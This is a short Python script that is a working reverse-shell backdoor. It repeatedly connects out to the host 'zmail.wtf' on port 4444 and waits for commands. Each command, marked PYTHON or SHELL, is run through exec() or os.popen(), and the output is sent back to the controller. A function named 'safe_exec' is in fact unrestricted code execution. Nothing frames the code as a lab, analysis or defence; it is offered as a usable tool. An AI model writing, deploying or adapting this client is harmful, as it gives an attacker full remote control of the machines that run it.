import subprocess
import sys

# List of required standard libraries
required_modules = ['socket', 'time', 'os', 'traceback']

# Function to check for modules
def check_modules(modules):
    for mod in modules:
        try:
            __import__(mod)
        except ImportError:
            print(f"[!] Module {mod} is missing. Attempting to install (may not work for standard libraries)...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", mod])

check_modules(required_modules)

import socket
import time
import os
import traceback

SERVER_HOST = 'zmail.wtf'  # ← change this!
SERVER_PORT = 4444

def safe_exec(code):
    try:
        exec_globals = {}
        exec_locals = {}
        exec(code, exec_globals, exec_locals)
        return str(exec_locals.get('result', 'Done'))
    except Exception:
        return traceback.format_exc()

def shell_exec(command):
    try:
        return os.popen(command).read()
    except Exception:
        return traceback.format_exc()

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_HOST, SERVER_PORT))
            print("[+] Connected to controller")

            while True:
                data = s.recv(4096).decode()
                if not data:
                    break

                if "|" not in data:
                    continue

                mode, command = data.split("|", 1)
                mode = mode.strip().upper()

                if mode == "PYTHON":
                    result = safe_exec(command)
                elif mode == "SHELL":
                    result = shell_exec(command)
                else:
                    result = f"Unknown mode: {mode}"

                s.sendall(result.encode())

    except Exception as e:
        print("[-] Failed to connect. Retrying in 5s...")
        time.sleep(5)
